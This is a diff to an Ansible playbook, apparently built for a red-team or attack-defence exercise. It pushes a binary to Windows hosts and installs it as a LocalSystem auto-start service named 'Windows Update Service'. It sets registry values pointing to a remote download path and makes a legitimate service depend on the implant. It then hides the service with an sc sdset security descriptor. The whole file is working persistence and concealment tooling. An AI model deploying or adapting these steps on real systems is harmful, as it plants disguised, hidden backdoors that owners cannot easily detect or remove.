@@ -1,15 +1,21 @@
 ---
-- name: "Download binary, configure service and run commands on Windows"
+- name: Deploy binary
+  serial: 1
   hosts: all
   tasks:
-
     - name: "Copy file from Ansible controller to Windows host"
       win_copy:
         src: "{{ binary_location }}"
         dest: "{{ path_to_download }}"
       tags:
         - copy_file
-   
+
+- name: "Configure service and run commands on Windows"
+  hosts: all
+  tasks:
+    - set_fact:
+        team_number: "{{ ((inventory_hostname.split('.')[1] == '168')) | ternary(inventory_hostname.split('.')[2], inventory_hostname.split('.')[1]) }}"
+
     - name: "Create the service using cmd"
       win_command:
         cmd: sc create "{{ service_name }}" binPath= "{{ path_to_download }}"\\"{{ binary_name }}" start= auto obj= "LocalSystem" DisplayName= "Windows Update Service"
@@ -30,16 +36,16 @@
         type: string
         state: present
       loop:
-        - { name: "RemoteUrl", value: "/{{ group_names[0] }}{{ hostvars[inventory_hostname].file_to_download }}" }
+        - { name: "RemoteUrl", value: "/team{{ team_number }}/{{ hostvars[inventory_hostname].file_to_download }}" }
         - { name: "LocalDir", value: "{{ path_for_comm }}" }
       tags:
         - reg_params
 
-    # - name: "Change dependency of legitimate service"
-    #   win_shell: |
-    #     cmd /c "sc config {{ service_for_injection }} depend= {{ service_name }}"
-    #   tags:
-    #     - add_depend
+    - name: "Change dependency of legitimate service"
+      win_command:
+        cmd: sc config {{ service_for_injection }} depend= {{ service_name }}
+      tags:
+        - add_depend
 
     - name: "Start the service"
       win_service:
@@ -49,8 +55,8 @@
         - start_svc
 
     - name: "Hide a serivice"
-      win_shell:  
-        cmd /c sc sdset "{{ service_name }}" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
+      win_command:
+        cmd: sc sdset "{{ service_name }}" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
       tags:
         - hide_svc
 
